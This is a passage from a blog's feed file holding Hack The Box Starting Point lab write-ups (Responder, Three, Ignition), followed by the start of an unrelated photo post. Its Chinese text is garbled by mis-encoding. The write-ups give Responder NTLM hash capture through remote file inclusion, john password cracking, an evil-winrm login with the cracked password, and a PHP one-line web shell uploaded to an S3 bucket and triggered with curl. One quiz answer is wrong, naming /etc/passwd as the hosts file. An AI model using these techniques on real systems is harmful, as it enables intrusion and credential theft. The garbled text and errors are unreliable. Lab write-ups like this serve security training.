alt="image-20230130000857706"></p><p>æ‰«ææ‰¾åˆ°ç™»å½•é¡µé¢</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">10.129.33.176</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230130002433765.png" alt="image-20230130002433765"></p><p>ç„¶åæŠ“åŒ…å­—å…¸çˆ†ç ´å¾—åˆ°è´¦å·å¯†ç ï¼Œç™»å½•å¾—åˆ°flag</p><p><img src="/2022/09/23/STARTING-POINT/image-20230130003936082.png" alt="image-20230130003936082"></p><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><h3 id="Tags-11"><a href="#Tags-11" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>WinRM</code></p><p><code>ç½‘ç»œ</code></p><p><code>ä¼ ç»Ÿåº”ç”¨</code></p><p><code>åè®®</code></p><p><code>XAMPP</code></p><p><code>SMB</code></p><p><code>Responder</code></p><p><code>PHP</code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>å¯†ç ç ´è§£</code></p><p><code>å“ˆå¸Œæ•è·</code></p><p><code>è¿œç¨‹æ–‡ä»¶åŒ…å«</code></p><p><code>è¿œç¨‹ä»£ç æ‰§è¡Œ</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-11"><a href="#çŸ¥è¯†ç‚¹-11" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li>ç”¨äºåŠ è½½ç½‘é¡µä¸åŒè¯­è¨€ç‰ˆæœ¬çš„ URL å‚æ•°çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ:<code>page</code></li><li>page å‚æ•°çš„ä»¥ä¸‹å“ªäº›å€¼æ˜¯åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å« (LFI) æ¼æ´çš„ç¤ºä¾‹:<code>../../../../../../../../windows/system32/drivers/etc/hosts</code></li><li>page å‚æ•°çš„ä»¥ä¸‹å“ªäº›å€¼æ˜¯åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å« (RFI) æ¼æ´çš„ç¤ºä¾‹ï¼š<code>//10.10.14.6/somefile</code></li><li>NTLM ä»£è¡¨ä»€ä¹ˆï¼Ÿ:<code>New Technology LAN Manager</code></li><li>åœ¨ Responder å®ç”¨ç¨‹åºä¸­ä½¿ç”¨å“ªä¸ªæ ‡å¿—æ¥æŒ‡å®šç½‘ç»œæ¥å£ï¼Ÿï¼š<code>-i</code></li><li>æœ‰å‡ ç§å·¥å…·å¯ä»¥æ¥å— NetNTLMv2 è´¨è¯¢&#x2F;å“åº”å¹¶å°è¯•æ•°ç™¾ä¸‡ä¸ªå¯†ç ä»¥æŸ¥çœ‹å…¶ä¸­æ˜¯å¦æœ‰ä»»ä½•ä¸€ä¸ªç”Ÿæˆç›¸åŒçš„å“åº”ã€‚ä¸€ç§è¿™æ ·çš„å·¥å…·é€šå¸¸è¢«ç§°ä¸º <code>john</code>ï¼Œä½†å…¨åæ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>John the Ripper</code></li></ol></blockquote><h4 id="å‘½ä»¤Responder"><a href="#å‘½ä»¤Responder" class="headerlink" title="å‘½ä»¤Responder"></a>å‘½ä»¤Responder</h4><p>å¯åŠ¨<code>responder</code>å¹¶æŒ‡å®š<strong>ç›‘å¬</strong>æœ¬åœ°çš„<code>tun0</code>ç½‘å¡ï¼Œ</p><p>ç„¶åç”±äºé¶æœºå­˜åœ¨<code>RFI</code>ï¼Œå› æ­¤å¯ä»¥è¿œç¨‹è®¿é—®æœ¬åœ°çš„æŸä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨<code>responder</code>æ‹¿åˆ°ä¸»æœºçš„<code>administrator</code>çš„<strong>å“ˆå¸Œ</strong>ï¼Œç„¶åä½¿ç”¨<code>john</code>ç ´è§£ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -<span class="selector-tag">I</span> tun0</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230130222039665.png" alt="image-20230130222039665"></p><blockquote><p>è®¿é—®<code>http://unika.htb/index.php?page=//10.10.16.28/somefile</code></p><p>[éœ€è¦å…ˆä¿®æ”¹<code>hosts</code>æ–‡ä»¶ï¼ŒæŠŠé‡å®šå‘ipä¿®æ”¹åˆ°å¯¹åº”åŸŸå]</p><p>è¿™é‡Œipä¸ºæœ¬åœ°tun0ç½‘å¡ip</p></blockquote><p><img src="/2022/09/23/STARTING-POINT/image-20230130225041057.png" alt="image-20230130225041057"></p><p><img src="/2022/09/23/STARTING-POINT/image-20230130225118212.png" alt="image-20230130225118212"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -t <span class="built_in">hash</span>.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç </p><p>evil-winrmç™»å½•</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -<span class="selector-tag">i</span> <span class="number">10.129</span>.<span class="number">198.112</span> -u Administrator -<span class="selector-tag">p</span> badminton</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230130232209879.png" alt="image-20230130232209879"></p><p><code>flag</code>åœ¨<code>mike</code>ç”¨æˆ·çš„<code>Desktop</code>ç›®å½•ä¸­</p><h4 id="ä»€ä¹ˆæ˜¯smbï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯smbï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯smbï¼Ÿ"></a>ä»€ä¹ˆæ˜¯smbï¼Ÿ</h4><blockquote><p><em>SMB</em>(å…¨ç§°æ˜¯Server Message Block)æ˜¯ä¸€ä¸ªç½‘ç»œåè®®åï¼Œå®ƒèƒ½è¢«ç”¨äºWebè¿æ¥å’Œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„ä¿¡æ¯æ²Ÿé€šã€‚</p></blockquote><h4 id="ä»€ä¹ˆæ˜¯WinRMï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯WinRMï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯WinRMï¼Ÿ"></a>ä»€ä¹ˆæ˜¯WinRMï¼Ÿ</h4><blockquote><p><strong>WinRM</strong>ï¼ˆ<strong>Windows è¿œç¨‹ç®¡ç†</strong>ï¼Œ<strong>Windows Remote Management</strong>ï¼‰æ˜¯<a href="https://zh.m.wikipedia.org/wiki/WEB%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86">WEBæœåŠ¡ç®¡ç†</a>äº<a href="https://zh.m.wikipedia.org/wiki/%E5%BE%AE%E8%BD%AF">å¾®è½¯</a>çš„<a href="https://zh.m.wikipedia.org/wiki/Microsoft_Windows">Microsoft Windows</a>ä¸­çš„<a href="https://zh.m.wikipedia.org/wiki/%E5%AF%A6%E7%8F%BE">å®ç°</a>ï¼Œå®ƒå…è®¸å¤„äºä¸€ä¸ªå…±åŒ<a href="https://zh.m.wikipedia.org/wiki/%E7%B6%B2%E7%B5%A1">ç½‘ç»œ</a>å†…çš„<a href="https://zh.m.wikipedia.org/wiki/Microsoft_Windows">Microsoft Windows</a>è®¡ç®—æœºå½¼æ­¤ä¹‹é—´äº’ç›¸è®¿é—®å’Œäº¤æ¢ä¿¡æ¯ã€‚åœ¨ä¸€å°æœºå™¨å¯ç”¨WinRMåï¼Œå¦ä¸€å°æœºå™¨å°±èƒ½é€šè¿‡<a href="https://zh.m.wikipedia.org/wiki/Windows_PowerShell">Windows PowerShell</a>å¯¹å¼€å¯WinRMçš„æœºå™¨è¿›è¡Œ<a href="https://zh.m.wikipedia.org/wiki/%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86">è¿œç¨‹ç®¡ç†</a></p></blockquote><h4 id="ä»€ä¹ˆæ˜¯XAMPPï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯XAMPPï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯XAMPPï¼Ÿ"></a>ä»€ä¹ˆæ˜¯XAMPPï¼Ÿ</h4><blockquote><p>XAMPPï¼ˆ<a href="https://baike.baidu.com/item/Apache/6265">Apache</a>+MySQL+<a href="https://baike.baidu.com/item/PHP/9337">PHP</a>+PERLï¼‰æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å»ºç«™é›†æˆ<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6%E5%8C%85/10508451">è½¯ä»¶åŒ…</a>ã€‚è¿™ä¸ªè½¯ä»¶åŒ…åŸæ¥çš„åå­—æ˜¯ LAMPPï¼Œä½†æ˜¯ä¸ºäº†é¿å…è¯¯è§£ï¼Œæœ€æ–°çš„å‡ ä¸ªç‰ˆæœ¬å°±æ”¹åä¸º XAMPP äº†ã€‚å®ƒå¯ä»¥åœ¨Windowsã€<a href="https://baike.baidu.com/item/Linux/27050">Linux</a>ã€<a href="https://baike.baidu.com/item/Solaris/3517">Solaris</a>ã€[Mac OS X](<a href="https://baike.baidu.com/item/Mac">https://baike.baidu.com/item/Mac</a> OS X&#x2F;470629) ç­‰å¤šç§æ“ä½œç³»ç»Ÿä¸‹å®‰è£…ä½¿ç”¨ï¼Œæ”¯æŒå¤šè¯­è¨€ï¼šè‹±æ–‡ã€ç®€ä½“ä¸­æ–‡ã€<a href="https://baike.baidu.com/item/%E7%B9%81%E4%BD%93%E4%B8%AD%E6%96%87/2677789">ç¹ä½“ä¸­æ–‡</a>ã€<a href="https://baike.baidu.com/item/%E9%9F%A9%E6%96%87/20585">éŸ©æ–‡</a>ã€<a href="https://baike.baidu.com/item/%E4%BF%84%E6%96%87/5491693">ä¿„æ–‡</a>ã€æ—¥æ–‡ç­‰ã€‚</p></blockquote><h4 id="ä»€ä¹ˆæ˜¯NTLMï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯NTLMï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯NTLMï¼Ÿ"></a>ä»€ä¹ˆæ˜¯NTLMï¼Ÿ</h4><blockquote><p>NTLMæ˜¯Windows æ–°æŠ€æœ¯ LAN ç®¡ç†å™¨(NTLM) æ˜¯ Microsoft æä¾›çš„ä¸€å¥—å®‰å…¨åè®®ï¼Œç”¨äºéªŒè¯ç”¨æˆ·èº«ä»½å¹¶ä¿æŠ¤å…¶æ´»åŠ¨çš„å®Œæ•´æ€§å’Œæœºå¯†æ€§ã€‚</p><p>æŒ‡telnet çš„ä¸€ç§<code>éªŒè¯èº«ä»½æ–¹å¼</code>ï¼Œå³é—®è¯¢&#x2F;åº”ç­”èº«ä»½éªŒè¯åè®®ï¼Œæ˜¯Windows NT æ—©æœŸç‰ˆæœ¬çš„æ ‡å‡†å®‰å…¨åè®®ï¼ŒWindows 2000 æ”¯æŒNTLM æ˜¯ä¸ºäº†ä¿æŒå‘åå…¼å®¹ã€‚ Windows 2000å†…ç½®ä¸‰ç§åŸºæœ¬å®‰å…¨åè®®ä¹‹ä¸€ã€‚</p></blockquote><h4 id="ä»€ä¹ˆæ˜¯Responderï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Responderï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Responderï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Responderï¼Ÿ</h4><blockquote><p>Responderå°±æ˜¯è¿™æ ·ä¸€ç§<code>åˆ©ç”¨èº«ä»½è®¤è¯åè®®ï¼Œç›‘å¬è·å–å£ä»¤å“ˆå¸Œ</code>çš„å·¥å…·ã€‚ å¦‚æœ<strong>å®¢æˆ·ç«¯&#x2F;ç›®æ ‡æ— æ³•é€šè¿‡DNSåŸŸåè§£æï¼Œåˆ™ä¼šå›é€€åˆ°LLMNRï¼ˆåœ¨Windows Vistaä¸­å¼•å…¥ï¼‰å’ŒNBT-NSè¿›è¡Œè§£æ</strong>ã€‚ <code>LLMNR</code>ï¼ˆé“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æï¼‰ï¼šå¤šæ’­æ–¹å¼æŸ¥æ‰¾ç½‘ç»œä¸Šçš„ä¸»æœºï¼Œå…¶å®ƒä¸»æœºå“åº”IPï¼Œç„¶åè¿æ¥ã€‚</p></blockquote><h4 id="ä»€ä¹ˆæ˜¯evil-winrmï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯evil-winrmï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯evil-winrmï¼Ÿ"></a>ä»€ä¹ˆæ˜¯evil-winrmï¼Ÿ</h4><blockquote><p>evil-winrmæ˜¯<code>Windows</code>è¿œç¨‹ç®¡ç†(WinRM) Shellçš„ç»ˆæç‰ˆæœ¬ã€‚ Windowsè¿œç¨‹ç®¡ç†æ˜¯â€œWS ç®¡ç†åè®®çš„Microsoft å®æ–½ï¼Œè¯¥åè®®æ˜¯åŸºäºæ ‡å‡†SOAPã€ä¸å—é˜²ç«å¢™å½±å“çš„åè®®ï¼Œå…è®¸ä¸åŒä¾›åº”å•†çš„ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿç›¸äº’æ“ä½œã€‚</p></blockquote><h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><h3 id="Tags-12"><a href="#Tags-12" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>ç½‘ç»œ</code></p><p><code>Cloud</code></p><p><code>ä¼ ç»Ÿåº”ç”¨</code></p><p><code>AWS</code></p><p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>ç½‘ç«™ç»“æ„å‘ç°</code></p><p><code>æ¡¶æšä¸¾</code></p><p><code>ä»»æ„æ–‡ä»¶ä¸Šä¼ </code></p><p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-12"><a href="#çŸ¥è¯†ç‚¹-12" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li>å“ªä¸ªå‘½ä»¤è¡Œå®ç”¨ç¨‹åºå¯ç”¨äºä¸åœ¨å·²å‘ç°çš„å­åŸŸä¸Šè¿è¡Œçš„æœåŠ¡è¿›è¡Œäº¤äº’ï¼Ÿï¼š<code>awscli</code></li><li>å“ªä¸ªå‘½ä»¤ç”¨äºè®¾ç½® AWS CLI å®‰è£…ï¼Ÿï¼š<code>aws configure</code></li><li>ä¸Šè¿°å®ç”¨ç¨‹åºç”¨äºåˆ—å‡ºæ‰€æœ‰ S3 å­˜å‚¨æ¡¶çš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>aws s3 ls</code></li></ol></blockquote><h4 id="å‘½ä»¤-1"><a href="#å‘½ä»¤-1" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h4><p><code>gobuster</code>çˆ†ç ´å­åŸŸå</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -w <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>subdomains-top1million-<span class="number">5000</span>.txt -u http:<span class="regexp">//</span>thetoppers.htb</span><br></pre></td></tr></table></figure><p>åˆ—å‡ºè¯¥<code>s3å­˜å‚¨æ¡¶</code>ä¸‹çš„å†…å®¹</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="keyword">ls</span> <span class="params">--endpoint=http</span>:<span class="string">//s3.thetoppers.htb/</span> s3:<span class="string">//thetoppers.htb</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230131004300879.png" alt="image-20230131004300879"></p><p>æœ¬åœ°å†™ä¸€ä¸ª<code>ä¸€å¥è¯æœ¨é©¬è„šæœ¬</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell.php </span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æœ¬åœ°ä¸€å¥è¯æœ¨é©¬åˆ°s3å­˜å‚¨æ¡¶</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">aws</span> <span class="built_in">s3</span> <span class="meta">cp</span> shell.php --endpoint<span class="symbol">=http</span>:<span class="comment">//s3.thetoppers.htb/ s3://thetoppers.htb </span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230131004712717.png" alt="image-20230131004712717"></p><p>è®¿é—®çœ‹çœ‹æ˜¯å¦æˆåŠŸ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span>thetoppers.htb/shell.php?cmd=ls</span><br></pre></td></tr></table></figure><p><img src="/2022/09/23/STARTING-POINT/image-20230131004810309.png" alt="image-20230131004810309"></p><p>ç„¶åèšå‰‘è¿æ¥ä¹Ÿè¡Œï¼Œä½†htbçš„vpnä¸èµ°ä¸»æœºè¿ä¸ä¸Š</p><p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨ncåå¼¹shellï¼Œä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨è„šæœ¬åœ¨è¿›è¡Œå‘½ä»¤æ‰§è¡Œè¯»å–flag</p><p><img src="/2022/09/23/STARTING-POINT/image-20230131005440119.png" alt="image-20230131005440119"></p><h4 id="ä»€ä¹ˆæ˜¯awsï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯awsï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯awsï¼Ÿ"></a>ä»€ä¹ˆæ˜¯awsï¼Ÿ</h4><blockquote><p>äºšé©¬é€Š<code>AWSï¼ˆAmazon Web Services (AWS) ï¼‰</code>æ˜¯äºšé©¬é€Šæä¾›çš„<code>æ˜¯å…¨çƒæœ€å…¨é¢ã€åº”ç”¨æœ€å¹¿æ³›çš„äº‘å¹³å°</code>ï¼Œä»å…¨çƒæ•°æ®ä¸­å¿ƒæä¾›è¶…è¿‡ 200 é¡¹åŠŸèƒ½é½å…¨çš„æœåŠ¡ã€‚æ•°ç™¾ä¸‡å®¢æˆ·(åŒ…æ‹¬å¢<code>é•¿æœ€å¿«é€Ÿçš„åˆåˆ›å…¬å¸ã€æœ€å¤§å‹ä¼ä¸šå’Œä¸»è¦çš„æ”¿åºœæœºæ„)éƒ½åœ¨ä½¿ç”¨ AWS</code> æ¥é™ä½æˆæœ¬ã€æé«˜æ•æ·æ€§å¹¶åŠ é€Ÿåˆ›æ–°ã€‚</p></blockquote><h4 id="ä»€ä¹ˆæ˜¯awscliï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯awscliï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯awscliï¼Ÿ"></a>ä»€ä¹ˆæ˜¯awscliï¼Ÿ</h4><blockquote><p><code>AWS å‘½ä»¤è¡Œç•Œé¢ï¼ˆAWS CLIï¼‰</code>æ˜¯ç”¨äºç®¡ç†AWS äº§å“çš„ç»Ÿä¸€å·¥å…·ã€‚ åªéœ€è¦ä¸‹è½½å’Œé…ç½®ä¸€ä¸ªå·¥å…·ï¼Œæ‚¨å°±å¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œæ§åˆ¶å¤šä¸ªAWS äº§å“å¹¶<code>åˆ©ç”¨è„šæœ¬</code>æ¥è‡ªåŠ¨æ‰§è¡Œè¿™äº›æœåŠ¡</p></blockquote><h4 id="ä»€ä¹ˆæ˜¯-Amazon-S3ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-Amazon-S3ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ Amazon S3ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ Amazon S3ï¼Ÿ</h4><blockquote><p>Amazon Simple Storage Serviceï¼ˆAmazon S3ï¼‰æ˜¯ä¸€ç§<code>å¯¹è±¡å­˜å‚¨æœåŠ¡</code>ï¼Œæä¾›è¡Œä¸šé¢†å…ˆçš„å¯æ‰©å±•æ€§ã€æ•°æ®å¯ç”¨æ€§ã€å®‰å…¨æ€§å’Œæ€§èƒ½ã€‚å„ç§è§„æ¨¡å’Œè¡Œä¸šçš„å®¢æˆ·éƒ½å¯ä»¥ä½¿ç”¨ Amazon S3 å­˜å‚¨å’Œä¿æŠ¤ä»»æ„æ•°é‡çš„æ•°æ®ï¼Œ<code>ç”¨äºæ•°æ®æ¹–ã€ç½‘ç«™ã€ç§»åŠ¨åº”ç”¨ç¨‹åºã€å¤‡ä»½å’Œæ¢å¤ã€å½’æ¡£ã€ä¼ä¸šåº”ç”¨ç¨‹åºã€IoT è®¾å¤‡å’Œå¤§æ•°æ®åˆ†æ</code>ã€‚Amazon S3 æä¾›äº†ç®¡ç†åŠŸèƒ½ï¼Œä½¿æ‚¨å¯ä»¥ä¼˜åŒ–ã€ç»„ç»‡å’Œé…ç½®å¯¹æ•°æ®çš„è®¿é—®ï¼Œä»¥æ»¡è¶³æ‚¨çš„ç‰¹å®šä¸šåŠ¡ã€ç»„ç»‡å’Œåˆè§„æ€§è¦æ±‚ã€‚</p></blockquote><h4 id="ä»€ä¹ˆæ˜¯Bucket-Enumeration-å­˜å‚¨æ¡¶æšä¸¾-ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Bucket-Enumeration-å­˜å‚¨æ¡¶æšä¸¾-ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Bucket Enumeration(å­˜å‚¨æ¡¶æšä¸¾)ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Bucket Enumeration(å­˜å‚¨æ¡¶æšä¸¾)ï¼Ÿ</h4><blockquote><p><code>S3 å­˜å‚¨æ¡¶æšä¸¾</code>æ˜¯æŸ¥è¯¢ S3 å­˜å‚¨æ¡¶å’Œè¿™äº›å­˜å‚¨æ¡¶ä¸­çš„å¯¹è±¡çš„è¿‡ç¨‹ã€‚è¿™å¯ä»¥ä½¿ç”¨ä¸åŒçš„ AWS API è°ƒç”¨æ¥å®Œæˆï¼Œä¾‹å¦‚åˆ—å‡ºå­˜å‚¨æ¡¶ã€è·å–å­˜å‚¨æ¡¶å†…å®¹æˆ– ListObjectsã€‚æ­¤è¿‡ç¨‹æ—¨åœ¨ç¡®å®šç»™å®šå­˜å‚¨æ¡¶ä¸­å­˜åœ¨å“ªäº› S3 å¯¹è±¡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨æ­¤ä¿¡æ¯æ¥å¸®åŠ©æ‚¨æ›´å¥½åœ°äº†è§£æ‚¨çš„æ•°æ®èµ„æºï¼Œå¹¶å°±å¦‚ä½•æœ€å¥½åœ°ç®¡ç†å®ƒåšå‡ºå†³å®šã€‚</p></blockquote><h2 id="Ignition"><a href="#Ignition" class="headerlink" title="Ignition"></a>Ignition</h2><h3 id="Tags-13"><a href="#Tags-13" class="headerlink" title="Tags"></a>Tags</h3><blockquote><p><code>web</code></p><p><code>å¸¸è§åº”ç”¨</code></p><p><code>Magento</code></p><p><code>æ¸—é€æµ‹è¯•å‘˜ 1 çº§</code></p><p><code>ä¾¦å¯Ÿ</code></p><p><code>ç½‘ç«™ç»“æ„å‘ç°</code></p><p><code>å¼±å‡­æ®</code></p></blockquote><h3 id="çŸ¥è¯†ç‚¹-13"><a href="#çŸ¥è¯†ç‚¹-13" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote><ol><li>Linux è®¡ç®—æœºä¸Šä¿å­˜åŸŸååˆ° IP åœ°å€å¯¹çš„æœ¬åœ°åˆ—è¡¨çš„æ–‡ä»¶çš„å®Œæ•´è·¯å¾„æ˜¯ä»€ä¹ˆï¼Ÿ:<code>/etc/passwd</code></li><li>æŸ¥æ‰¾Magentoçš„å¯†ç è¦æ±‚ï¼Œå¹¶å°è¯•æœç´¢2023å¹´æœ€å¸¸è§çš„å¯†ç ã€‚å“ªä¸ªå¯†ç å¯ä»¥è®¿é—®ç®¡ç†å‘˜å¸æˆ·ï¼Ÿ:<code>qwerty123</code></li></ol></blockquote><h4 id="Magentoæ˜¯ä»€ä¹ˆ"><a href="#Magentoæ˜¯ä»€ä¹ˆ" class="headerlink" title="Magentoæ˜¯ä»€ä¹ˆ"></a>Magentoæ˜¯ä»€ä¹ˆ</h4><blockquote><p><strong>Magento</strong>æ˜¯<strong>Adobe</strong>å…¬å¸æ——ä¸‹ä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œçš„<strong>ä¸“ä¸šå¼€æºç”µå­å•†åŠ¡è§£å†³æ–¹æ¡ˆ</strong>ï¼Œä¸ºå•†å®¶æä¾›ä¸€ä¸ªå¤–è§‚ã€å†…å®¹å’ŒåŠŸèƒ½çš„å®Œå…¨çµæ´»æ§åˆ¶ã€‚Magentoç›´è§‚çš„ç®¡ç†ç•Œé¢åŒ…å«å¼ºå¤§çš„<strong>è¥é”€ã€å•†å“æ¨é”€å’Œå†…å®¹ç®¡ç†å·¥å…·</strong>ï¼Œä½¿å•†å®¶èƒ½å¤Ÿåˆ›å»ºé€‚åˆå…¶ç‹¬ç‰¹ä¸šåŠ¡éœ€æ±‚çš„ç«™ç‚¹ã€‚Magentoå·ç§°<strong>å®‡å®™æœ€å¼ºä¼ä¸šç»ˆæç”µå­å•†åŠ¡è§£å†³æ–¹æ¡ˆ</strong></p></blockquote><h4 id="2023å¹´æ’åå‰åçš„å¯†ç "><a href="#2023å¹´æ’åå‰åçš„å¯†ç " class="headerlink" title="2023å¹´æ’åå‰åçš„å¯†ç "></a>2023å¹´æ’åå‰åçš„å¯†ç </h4><blockquote><ol><li><code>123456</code></li><li><code>123456789</code></li><li><code>qwerty</code></li><li><code>password</code></li><li><code>12345</code></li><li><code>qwerty123</code></li><li><code>1q2w3e</code></li><li><code>12345678</code></li><li><code>111111</code></li><li><code>1234567890</code></li></ol></blockquote><h1 id="ç¬¬2å±‚"><a href="#ç¬¬2å±‚" class="headerlink" title="ç¬¬2å±‚"></a>ç¬¬2å±‚</h1>]]></content>
      
      
      <categories>
          
          <category> Hack the Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> htb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç„¶ç„¶ç¾ç…§æ</title>
      <link href="/2022/09/01/Diana/"/>
      <url>/2022/09/01/Diana/</url>
      
        <content type="html"><![CDATA[<p><strong><code>ç¼–ç¨‹ç©çš„å†å¥½ï¼Œæˆ‘ä¹Ÿä¸èƒ½ç¼–å‡ºå®Œç¾çˆ±æƒ…  </code></strong></p><p><strong><code>æ¸—é€ç©çš„å†å¼ºï¼Œæˆ‘ä¹Ÿä¸èƒ½ææƒè¿›ä½ çš„å¿ƒ</code></strong></p><span id="more"></span><p><img src="https://pic4.zhimg.com/80/v2-934e6fa2e65409827765dd10d55126fb_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://imgs.aixifan.com/content/2021_6_19/1.6240698992155275E9.jpeg" alt="img"></p><p><img src="https://imgs.aixifan.com/newUpload/1307743_bef3f9a1a99a46788042b04c38a7b243.jpeg" alt="img"></p><p><img src="https://imgs.aixifan.com/newUpload/1307743_760fe0000b7246ac811395092e22052d.jpeg" alt="img"></p><p><img src="https://imgs.aixifan.com/newUpload/1307743_c3ac0b2629d34c11a3f04bf00e742c8e.jpeg" alt="img"></p><p><img src="https://imgs.aixifan.com/newUpload/1307743_501d0f80926f45d386c1b09a7f60fa4e.jpeg" alt="img"></p><p><img src="https://imgs.aixifan.com/newUpload/1307743_1100ec000f55417f9ab605963c6b4496.jpeg" alt="img"></p><p><img src="https://imgs.aixifan.com/newUpload/1307743_60a32c7de2cc4eaf9d04c7bd251bf4ea.jpeg" alt="img"></p><p><img src="https://imgs.aixifan.com/newUpload/1307743_5dd902eab8dd4ab3979801ca40aabf0f.jpeg" alt="img"></p><p><img src="https://pica.zhimg.com/80/v2-932f2c2c69627ba96a8cfe1dea81e36f_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://pica.zhimg.com/80/v2-a3fb342d44bd85b2bd0641c826c6bbd0_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://pic2.zhimg.com/80/v2-f15c9426e18febfac5bde90270faf6a3_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://picx.zhimg.com/80/v2-dbb499988d949727a787cce0e5421583_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://pic2.zhimg.com/80/v2-89672d74dc493ddbf3152ab56b461b88_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://pic1.zhimg.com/80/v2-4b4ff0c4014e2a19d8e4973a15d29465_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://picx.zhimg.com/80/v2-c807aec307bef9260d824a2c5e0c0beb_1440w.jpg?source=1940ef5c" alt="img"></p><p><img src="https://pic1.zhimg.com/80/v2-6fe879b650da6caa23c3078ece271f13_1440w.jpg?source=1940ef5c" alt="img"></p><p><img 